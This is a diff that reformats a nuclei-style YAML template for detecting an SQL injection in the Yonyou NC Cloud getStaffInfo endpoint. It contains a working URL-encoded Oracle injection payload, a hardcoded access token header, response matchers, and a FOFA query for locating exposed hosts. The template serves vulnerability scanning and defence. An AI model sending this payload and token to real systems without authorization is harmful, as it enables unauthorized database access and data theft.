@@ -1,31 +1,32 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: yonyou-nc-cloud-getStaffInfo-sqli
+
+info:
+  name: 用友 NC Cloud getStaffInfo SQL 注入
+  author: ZacharyZcR
+  severity: critical
+  description: |
+    用友 NC Cloud attendstaff/getStaffInfo 接口 id 参数存在 SQL 注入，可执行任意 SQL。
+  reference:
+    - https://github.com/wy876/POC
+  metadata:
+    max-request: 1
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,nccloud,sqli
+
 http:
-  - headers:
-      accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+  - raw:
+      - |
+        GET /ncchr/attendstaff/getStaffInfo?id=1%27%29+AND+2787%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%282787%3D2787%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+gPZR HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 500
       - type: word
         part: body
         words:
-          - qzzzq1qzqzq
-        condition: and
-    method: GET
-    path:
-      - '{{BaseURL}}/ncchr/attendstaff/getStaffInfo?id=1%27%29+AND+2787%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%282787%3D2787%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+gPZR'
-id: yonyou-nc-cloud-getStaffInfo-sqli
-info:
-  author: ZacharyZcR
-  description: |
-    Yonyou NC-Cloud getStaffInfo interface has a SQL injection vulnerability.
-    The vulnerability allows attackers to execute arbitrary SQL statements through maliciously crafted requests.
-    FOFA: app="用友-NC-Cloud"
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: Yonyou NC-Cloud getStaffInfo SQL Injection
-  severity: critical
-  tags: yonyou,nc,nc-cloud,sqli,argus-import
+          - 'qzzzq1qzqzq'
+
+      - type: status
+        status:
+          - 500
